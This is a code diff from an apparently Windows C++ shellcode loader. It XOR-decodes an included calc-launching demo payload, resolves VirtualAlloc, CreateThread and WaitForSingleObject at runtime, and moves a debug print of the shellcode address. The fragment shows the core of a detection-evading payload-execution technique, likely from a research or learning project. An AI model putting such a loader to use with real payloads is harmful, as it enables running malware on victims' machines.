@@ -7,8 +7,6 @@
 #include "../../src/shellcodes/unobfuscated_calc.hpp"
 #endif
 
-#include "functions.hpp"
-
 
 void my_xor(unsigned char data[], int size, const unsigned char key[], int key_size)
 {
@@ -21,11 +19,7 @@ void my_xor(unsigned char data[], int size, const unsigned char key[], int key_s
 int main()
 {
 
-#if DEBUG
-	printf("Shellcode is located at %p\n", shellcode);
-	printf("Hit enter to continue\n");
-	getchar();
-#endif
+#include "functions.hpp"
 
 	// Step 1 : Get the addresses of the functions we want to call
 
@@ -69,6 +63,12 @@ int main()
 	auto CreateThread = (pCreateThread)CreateThread_address;
 	auto VirtualAlloc = (pVirtualAlloc)VirtualAlloc_address;
 	auto WaitForSingleObject = (pWaitForSingleObject)WaitForSingleObject_address;
+
+#if DEBUG
+	printf("Shellcode is located at %p\n", shellcode);
+	printf("Hit enter to continue\n");
+	getchar();
+#endif
 
 	// Step 2 : Allocate the memory
 	void* memory = VirtualAlloc(nullptr,
